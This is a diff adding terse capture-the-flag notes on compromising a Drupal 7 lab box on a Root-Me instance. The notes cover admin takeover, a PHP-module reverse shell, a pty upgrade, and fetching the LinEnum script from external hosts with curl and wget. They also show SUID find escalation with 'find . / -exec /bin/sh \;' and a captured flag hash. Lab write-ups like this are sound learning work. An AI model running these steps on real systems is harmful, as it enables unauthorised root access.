@@ -1,0 +1,39 @@
+ctf27.root-me.org
+163.172.228.194
+
+drupal 7
+tried unserialize for drupal 8 -> nothing
+
+use script with test:test
+
+test -> admin
+
+in flag3:
+Special PERMS will help FIND the passwd - but you'll need to -exec that
+command to work out how to get what's in the shadow.
+
+https://www.sevenlayers.com/index.php/164-drupal-to-reverse-shell
+
+-> modules to allow php content then add reverse shell
+
+shell as www-data -> /home/flag4/flag4.txt:
+```
+Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+```
+
+python -c 'import pty; pty.spawn("/bin/bash")' -> easier
+cd /var/www
+
+curl http://192.168.1.85/linenum.sh -> doesnt work
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+bash script -> suid files
+
+find is vulnerable
+find . / -exec /bin/sh \;
+
+-> root
+
+/passwd
+897f8695083ce0e82c09a79239afc548
